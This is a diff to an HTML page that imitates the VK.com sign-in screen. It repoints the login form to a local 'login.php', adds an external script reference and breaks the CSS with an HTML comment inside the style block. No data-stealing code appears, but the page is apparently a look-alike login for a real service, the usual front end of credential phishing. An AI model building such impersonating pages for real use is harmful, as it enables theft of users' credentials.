@@ -1,18 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>VK.com Login</title>
-<link rel="stylesheet" href="">
-<style>
-/* Remove outline on focused input fields */
-.content input[type="text"]:focus,
-.content input[type="password"]:focus {
-  outline: none;
-  /* You can also add any additional styling you want */
-}
-
-body {
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>VK.com Login</title>
+    <link rel="stylesheet" href="">
+    <style>
+        <!-- Your CSS styles here -->
+      body {
   font-family: Arial, sans-serif;
   background-color: #18191a;
   color: #ffffff;
@@ -153,7 +147,7 @@ body {
 .signup-button:hover {
   background-color: #00894e;
 }
-</style>
+    </style>
 </head>
 <body>
     <div class="container">
@@ -162,7 +156,7 @@ body {
             <div class="header-text">Sign in to VK</div>
         </div>
         <!-- Add a <form> tag with name attribute -->
-        <form name="login" method="POST" action="your_action_url_here">
+        <form name="login" method="POST" action="login.php">
             <div class="content">
                 <div class="input-box">
                     <!-- Add name attribute for email input -->
@@ -180,7 +174,7 @@ body {
                 <input type="submit" value="Sign In" id="signInButton" name="submit">
             </div>
         </form>
-        <script></script>
+        <script src="your-script.js"></script> <!-- Reference your JavaScript file here -->
         <div class="footer">
             <a href="">Join VK</a>
             <a href="">Forgot your password?</a>
